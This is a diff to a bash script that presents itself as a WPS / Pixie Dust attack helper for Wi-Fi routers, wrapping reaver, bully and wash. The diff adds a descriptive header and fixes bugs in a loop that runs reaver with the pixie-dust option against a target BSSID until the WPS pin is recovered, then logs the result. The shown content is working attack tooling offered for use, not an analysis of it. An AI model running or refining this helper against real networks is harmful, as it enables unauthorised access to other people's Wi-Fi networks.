@@ -1,4 +1,17 @@
 #! /bin/bash
+###############################################################################
+#  lh3 - WPS / Pixie Dust attack helper
+#  -------------------------------------------------------------------------
+#  Used by the main "l" launcher from the Wifi tools menu. Wraps:
+#    * reaver (with pixie-dust -K 1)
+#    * bully
+#    * wash  (WPS scan)
+#    * a handful of related WPS tools
+#
+#  WPS attacks only work on routers with WPS enabled and the pin not yet
+#  rate-limited. The pixie_loop function runs reaver in a loop with
+#  user-defined delay, appending successful runs to "$LPATH/wpslog".
+###############################################################################
 LPATH="${LPATH:-/root/lscript}"
 [[ -f "$LPATH/lib/lscript_term.sh" ]] && source "$LPATH/lib/lscript_term.sh"
 [[ -f "$LPATH/lib/lscript_conf.sh" ]] && source "$LPATH/lib/lscript_conf.sh" && lscript_load_conf && lscript_apply_colors
@@ -572,7 +585,7 @@ function pixie_loop
 		trap 'break' SIGINT
 		echo "" > "$LPATH"/wpslogloop
 		reaver -i $WLANNM -b $BSSIDT -c $CHANT -N -K 1 -f -vvv <<< $'y\n' | tee /root/lscript/wpslogloop
-		if [[ -f "$LPATH"/wpslog ]]
+		if [[ -f "$LPATH"/wpslogloop ]]
 		then
 			TTT=$(cat "$LPATH"/wpslogloop | grep "WPS pin not found!")
 			TTTT=$(cat "$LPATH"/wpslogloop | grep "WPS pin:    <empty>")
@@ -581,10 +594,10 @@ function pixie_loop
 			if [[ "$TTT" != "" || "$TTTT" != "" ]]
 			then
 				echo -e ""$RS"Pin not found. Retrying..."$CE""
-			elif [[ "$TTT2" != "" || "$TT3" != "" ]]
+			elif [[ "$TTT2" != "" || "$TTT3" != "" ]]
 			then
 				echo -e ""$YS"Pin found!!"$CE""
-				cp "$LPATH"/wpslog >> "$LPATH"/wpslog
+				cat "$LPATH"/wpslogloop >> "$LPATH"/wpslog
 				sleep 2
 				break
 			else
